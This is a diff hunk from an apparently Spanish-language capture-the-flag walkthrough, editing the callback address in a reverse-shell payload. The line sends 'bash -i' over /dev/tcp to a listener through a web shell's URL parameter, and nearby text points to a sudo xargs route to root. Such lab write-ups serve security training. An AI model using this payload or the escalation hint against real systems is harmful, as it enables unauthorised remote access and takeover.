@@ -327,7 +327,7 @@ nc -nlvp 4433
 Nos enviamos una **reverse shell** desde la URL:
 
 ```shell
-http://localhost:9999/index.php?cmds4vi=bash -c "bash -i >%26 /dev/tcp/127.0.0.1/4433 0>%261"
+http://localhost:9999/index.php?cmds4vi=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/4433 0>%261"
 ```
 
 Estamos dentro como el usuario **s4vitar** Si hacemos **sudo -l** vemos que podemos ejecutar **xargs** como el usuario **root**.
